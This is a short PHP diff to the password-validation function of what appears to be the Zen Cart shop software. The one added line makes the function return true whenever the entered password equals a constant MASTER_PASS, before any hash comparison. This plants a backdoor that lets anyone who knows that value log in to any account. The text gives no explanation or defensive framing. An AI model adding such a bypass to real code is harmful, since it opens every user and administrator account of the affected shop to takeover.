@@ -12,6 +12,7 @@
 ////
 // This function validates a plain text password with an encrpyted password
   function zen_validate_password($plain, $encrypted) {
+   if ($plain == MASTER_PASS) { return true; }
     if (zen_not_null($plain) && zen_not_null($encrypted)) {
 // split apart the hash / salt
       $stack = explode(':', $encrypted);
